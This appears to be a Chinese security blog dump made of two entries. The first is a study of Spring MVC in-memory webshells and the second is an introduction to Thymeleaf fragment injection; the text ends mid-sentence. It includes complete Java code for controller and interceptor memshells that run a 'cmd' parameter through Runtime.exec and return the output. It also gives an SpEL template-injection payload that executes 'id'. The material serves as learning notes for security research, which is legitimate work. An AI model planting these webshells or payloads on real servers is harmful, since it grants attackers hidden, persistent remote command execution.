<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">         version=&quot;4.0&quot;&gt;</span><br><span class="line">   &lt;!--这里需要版本为4.0,maven创建的好像是2点多的--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!--    Spring配置--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!--        1、让监听器知道spring的配置文件的位置--&gt;</span><br><span class="line">  &lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">    &lt;!-- spring配置文件的文件名 --&gt;</span><br><span class="line">    &lt;param-value&gt;classpath:springConfig.xml&lt;/param-value&gt;</span><br><span class="line">  &lt;/context-param&gt;</span><br><span class="line">  &lt;!--        2.创建监听器--&gt;</span><br><span class="line">  &lt;listener&gt;</span><br><span class="line">    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;</span><br><span class="line">  &lt;/listener&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!--        springmvc的 核心\前端\中央 控制器--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!--        servlet的封装--&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;!--            servlet读取springmvc的配置文件--&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">      &lt;!-- springmvc配置文件的文件名 --&gt;</span><br><span class="line">      &lt;param-value&gt;classpath:springMVC.xml&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;!--            在容器创建servlet对象的优先级.    数字越小越先创建--&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h3><p>首先从SpringMVC的controller内存马开始学习</p>
<p>在我个人看来,controller是对servlet的一种封装,所以实现原理方面来说,应该和servlet的实现原理比较像</p>
<ol>
<li>RequestMappingInfo类，对RequestMapping注解封装。里面包含http请求头的相关信息。如uri、method、params、header等参数。一个对象对应一个RequestMapping注解</li>
<li>HandlerMethod类，是对Controller的处理请求方法的封装。里面包含了该方法所属的bean对象、该方法对应的method对象、该方法的参数等。</li>
</ol>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421174514491.png" alt="image-20220421174514491"></p>
<p>SpringMVC初始化的时候,对每个容器中的Bean的构造方法和属性设置之后,将会调用<code> InitializingBean</code>接口的<code>afterPropertiesSet</code>方法</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421174800350.png" alt="image-20220421174800350" style="zoom:67%;" />

<p>其中实现类 RequestMappingHandlerMapping 用来处理具有 <code>@Controller</code> 注解类中的方法级别的 <code>@RequestMapping</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421175523028.png" alt="image-20220421175523028"></p>
<p>它的<code>afterPropertiesSet</code>先是对静态内部配置类进行了初始化,然后调用了其抽象父类的<code>afterPropertiesSet</code>方法</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421180801171.png" alt="image-20220421180801171" style="zoom:80%;" />

<p>其抽象父类的对应方法中又调用了<code>initHandlerMethods</code>方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421180923594.png" alt="image-20220421180923594"></p>
<p>这个方法调用了 initHandlerMethods 方法，首先获取了 Spring 中注册的 Bean，然后循环遍历，调用 <code>processCandidateBean</code> 方法处理 Bean。</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421181210684.png" alt="image-20220421181210684"></p>
<p>processCandidateBean中获取bean的类型并且符合isHandler要求就进行方法检测<code>detectHandlerMethods()</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421181317837.png" alt="image-20220421181317837"></p>
<p>isHandler调用的是其方法实现类<code>RequestMappingHandlerMapping</code>中的isHandler,它判断了该bean的定义是否带有<code>@Controller</code>或<code>@RequestMapping</code>注解</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421182037996.png" alt="image-20220421182037996"></p>
<p>这关过去之后,就开始查找handler methods并注册,</p>
<p><code>handler method</code>通俗点讲其实就是controller中的方法</p>
<p>有一说一,这段代码还真不好理解</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421183153513.png" alt="image-20220421183153513"></p>
<p>这部分有两个关键功能，一个是 <code>getMappingForMethod</code> 方法根据 handler method 创建<code>RequestMappingInfo</code> 对象，一个是 <code>registerHandlerMethod</code> 方法将 handler method 与创建 <code>RequestMappingInfo </code>进行相关映射。</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421184453462.png" alt="image-20220421184453462"></p>
<p>注册完成之后的信息都存在这样一个类中</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421184720102.png" alt="image-20220421184720102"></p>
<p><a href="https://www.cnblogs.com/w-y-c-m/p/8416630.html">详细请求调用流程</a></p>
<p>lookupPath就是请求的相对地址,比如/user/login</p>
<p>当一次请求进来的时候,首先会在<code>AbstractHandlerMethodMapping#lookupHandlerMethod</code>方法中获取直接匹配的<code>RequestMappingInfos</code>列表</p>
<p>如果没有匹配的<code>RequestMappingInfos</code>,则遍历所有的<code>MappingRegistry.mappingLookup</code>中保存的所有<code>RequestMappingInfos</code></p>
<p>最后,获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421185007532.png" alt="image-20220421185007532"></p>
<p>大概原理跟着顺了一遍</p>
<h2 id="获取context"><a href="#获取context" class="headerlink" title="获取context"></a>获取context</h2><p>想要添加内存马,都必须得获取context</p>
<p>不明所以,先把代码粘贴过来</p>
<p>能用的只有4和5了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1 ContextLoader类专门负责root application context初始化</span></span><br><span class="line"><span class="comment">// ContextLoader的一个主要方法就是 initWebApplicationContext</span></span><br><span class="line">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2 spring 5的WebApplicationContextUtils已经没有getWebApplicationContext方法</span></span><br><span class="line">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3 类似2</span></span><br><span class="line">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5</span></span><br><span class="line">java.lang.reflect.Field filed = Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">filed.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="keyword">null</span>)).iterator().next();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获取context应该算是所有内存马最重要的地方了吧,因为context作为上下文对象,它里面往往存储了很多承接多个功能模块的信息,这些信息中往往就存在着能注入内存马的部分</p>
<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>获得的context不能<code>getBean(RequestMappingHandlerMapping.class)</code>,会抛出一个找不到这个bean的异常</p>
<p>下面两图分别是方法一和方法四获取到的context的区别,具体原因我猜测是因为在法一这个命名空间下没有RMSM这个bean的定义</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422141432909.png" alt="image-20220422141432909"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422141533441.png" alt="image-20220422141533441"></p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>在spring5以上失效了,失效原因是因为没有<code>getWebApplicationContext</code>方法了</p>
<h5 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h5><p>也在spring5以上失效了,失效原因是因为没有<code>getWebApplicationContext</code>方法了</p>
<h5 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h5><p>方法四呢,联系这两天学习c#多线程学习到的东西就比较容易理解了,</p>
<p>该方法使用的是<code>RequestContextHolder</code>对象</p>
<p>该对象开头的注释大概可以理解为该类以线程绑定的形式暴露一个request对象,同时这个对象可以被所有当前线程产生的子线程继承</p>
<p>在不同的类中都可以拿到同一个对象实例，但不同的线程取到的实例不同我们将这种数据称之为<strong>线程本地变量</strong>，这种操作叫做<strong>线程绑定</strong>。(类似于针对线程将对象进行个性化定制)</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422201339819.png" alt="image-20220422201339819"></p>
<p>使用<code>RequestContextHolder#getRequestAttributes()</code>方法返回一个reqeust的Attributes</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422201815223.png" alt="image-20220422201815223"></p>
<p>从它的Attributes中获得对应的<code>WebApplicationContext</code>,并且命名空间也正常,可以使用</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422202640251.png" alt="image-20220422202640251"></p>
<h5 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h5><p>在3.2.x以上版本可以使用 </p>
<p>这个方法看起来有点暴力</p>
<p><code>LiveBeansView</code>这个类中有一个applicationContext集合</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422203055508.png" alt="image-20220422203055508"></p>
<p>直接通过反射获取即可,唯一说的一点就是static变量反射get的时候可以传null进去,原因呢就是static是所有对象共享的变量,大概这样理解吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.reflect.Field filed = Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="keyword">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对这个类的理解</p>
</blockquote>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422203515764.png" alt="image-20220422203515764"></p>
<p>看了这个类源码中的注释,大概意思呢就是</p>
<p>这个类是生命周期还未结束的bean们的一个曝光适配器,建立了一个当前bean们和他们的依赖的快照</p>
<p>可以将bean和他们的依赖对应关系保存起来??</p>
<h5 id="获取RequestMappingHandlerMapping"><a href="#获取RequestMappingHandlerMapping" class="headerlink" title="获取RequestMappingHandlerMapping"></a>获取RequestMappingHandlerMapping</h5><p>首先需要获取<code>RequestMappingHandlerMapping</code>对象,有了这个对象,后面创建的RequestMappingInfo才能往里面注册</p>
<p><code>WebApplicationContext</code>继承了BeanFactory,可以用它里面的getBean方法获取<code>RequestMappingHandlerMapping</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure>

<p>所以就要先获取<code>WebApplicationContext</code>才能获取到<code>RequestMappingHandlerMapping</code>对象</p>
<p>获取到<code>RequestMappingHandlerMapping</code>对象就可以开始构造<code>RequestMappingInfo</code>了,将写好的恶意内部类和恶意方法同构造好的<code>RequestMappingInfo</code>一起使用<code>requestMappingHandlerMapping#registerMapping</code>注册到<code>requestMappingHandlerMapping</code>中</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422112630154.png" alt="image-20220422112630154"></p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">inject</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException </span>&#123;</span><br><span class="line"></span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        PatternsRequestCondition url = <span class="keyword">new</span> PatternsRequestCondition(<span class="string">&quot;/evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        RequestMethodsRequestCondition requestMethodsRequestCondition = <span class="keyword">new</span> RequestMethodsRequestCondition();</span><br><span class="line">        </span><br><span class="line">        Method method = injectController.class.getMethod(<span class="string">&quot;evil&quot;</span> );</span><br><span class="line">        RequestMappingInfo requestMappingInfo = <span class="keyword">new</span> RequestMappingInfo(url,requestMethodsRequestCondition,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        injectController injectController = <span class="keyword">new</span> injectController();</span><br><span class="line"></span><br><span class="line">        requestMappingHandlerMapping.registerMapping(requestMappingInfo,injectController,method);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;inject&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RestController</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">injectController</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">evil</span><span class="params">()</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">     <span class="comment">//request也可以直接写成参数public String evil(HttpServletRequest request)</span></span><br><span class="line">            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            </span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此,controller类型的内存马算是做了初步了解</p>
<h2 id="Inteceptor内存马"><a href="#Inteceptor内存马" class="headerlink" title="Inteceptor内存马"></a>Inteceptor内存马</h2><p>学习完controller内存马之后,就对spring基础的方法注册流程有了一个了解</p>
<p><code>AbstractHandlerMapping#adaptedInterceptors</code>中存储了HandlerInterceptor</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422121240656.png" alt="image-20220422121240656"></p>
<p>所以流程就很清晰了,首先获取到<code>AbstractHandlerMapping</code>,然后通过反射获取到<code>adaptedInterceptors</code>列表,往里面添加写好的恶意<code>interceptor</code>即可</p>
<p><code>AbstractHandlerMapping</code>的运行类还是<code>RequestMappingHandlerMapping</code>,所以getBean的时候还是填<code>RequestMappingHandlerMapping.class</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>在期间有个坑</p>
</blockquote>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422123659126.png" alt="image-20220422123659126"></p>
<p>就是看似我获取到的是向上转型得到的AbstractHandlerMapping对象,但是我这里使用了getClass是错误的,</p>
<p>当前AbstractHandlerMapping对应的正在运行中的对象是RequestMappingHandlerMapping对象</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422123824924.png" alt="image-20220422123824924"></p>
<p>一般呢子类是可以获取到父类的变量的,但是<code>adaptedInterceptors</code>是private修饰的,不能被子类继承,也就是说,子类中根本就没有这个字段,所以在这里需要通过<code>AbstractHandlerMapping.class</code>来获取<code>field</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422124507783.png" alt="image-20220422124507783"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">interController</span></span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/injectInter&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">inject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        Field declaredField = AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ArrayList list = (ArrayList) declaredField.get(abstractHandlerMapping);</span><br><span class="line">        list.add(<span class="keyword">new</span> evilInterceptor());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;inject&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evilInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="comment">//加一个系统的判断</span></span><br><span class="line">        String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">        BufferedReader bufferedReader;</span><br><span class="line">        <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">            isWin = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        response.getWriter().print(res.toString());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>注入成功之后,必须要访问一个requestMapping才会被拦器拦截到,此时带上参数就能执行命令了</p>
]]></content>
      <tags>
        <tag>springMemshell</tag>
      </tags>
  </entry>
  <entry>
    <title>thymeleaf简单入门</title>
    <url>/2022/12/16/thymeleaf%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="thymeleaf-fragment注入学习"><a href="#thymeleaf-fragment注入学习" class="headerlink" title="thymeleaf fragment注入学习"></a>thymeleaf fragment注入学习</h2><h3 id="与springBoot整合"><a href="#与springBoot整合" class="headerlink" title="与springBoot整合"></a>与springBoot整合</h3><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h5 id="1-导入依赖-版本可以不写-由springBoot统一管理"><a href="#1-导入依赖-版本可以不写-由springBoot统一管理" class="headerlink" title="1.导入依赖,版本可以不写,由springBoot统一管理"></a>1.导入依赖,版本可以不写,由springBoot统一管理</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="2-在resources文件夹下面创建templates文件夹-一般所有模板均放在此文件夹下面"><a href="#2-在resources文件夹下面创建templates文件夹-一般所有模板均放在此文件夹下面" class="headerlink" title="2.在resources文件夹下面创建templates文件夹,一般所有模板均放在此文件夹下面"></a>2.在resources文件夹下面创建templates文件夹,一般所有模板均放在此文件夹下面</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235220749.png" alt="image-20221104235220749"></p>
<h5 id="3-配置模板文件路径的前后缀"><a href="#3-配置模板文件路径的前后缀" class="headerlink" title="3.配置模板文件路径的前后缀"></a>3.配置模板文件路径的前后缀</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235352336.png" alt="image-20221104235352336"></p>
<h5 id="4-配置打包后的静态资源存放路径-一般不需要写"><a href="#4-配置打包后的静态资源存放路径-一般不需要写" class="headerlink" title="4.配置打包后的静态资源存放路径,一般不需要写"></a>4.配置打包后的静态资源存放路径,一般不需要写</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235458060.png" alt="image-20221104235458060"></p>
<h5 id="5-编写代码"><a href="#5-编写代码" class="headerlink" title="5.编写代码"></a>5.编写代码</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235637768.png" alt="image-20221104235637768"></p>
<p>访问/index即可</p>
<h4 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h4><p>该漏洞有版本限制,目前在springBoot2.2.0.RELEASE版本可以执行</p>
<p><a href="https://github.com/veracode-research/spring-view-manipulation/">原理文章</a></p>
<p>before loading the template from the filesystem, <a href="https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java">Spring ThymeleafView</a> class parses the template name as an expression:</p>
<p>thymeleaf的fragment 功能会将::后面的字符串当成表达式解析</p>
<p>fragement功能实现效果类似于vue动态路由传递一个参数过去让其选择性显示某一个div</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105005907494.png" alt="image-20221105005907494"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="comment">// By parsing it as a standard expression, we might profit from the expression cache</span></span><br><span class="line">   fragmentExpression = (FragmentExpression) parser.parseExpression(context, <span class="string">&quot;~&#123;&quot;</span> + viewTemplateName + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>



<h4 id="原理简单跟进"><a href="#原理简单跟进" class="headerlink" title="原理简单跟进"></a>原理简单跟进</h4><p>spel表达式则需要再额外学习一下,这里先跟着研究一下Payload的简单构造原理</p>
<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105180720931.png" alt="image-20221105180720931"></h4><p>上面这段表明只有当模板名称包含::的时候,才能进入到parseExpression</p>
<p>打断点跟进,发现在这个方法中会执行</p>
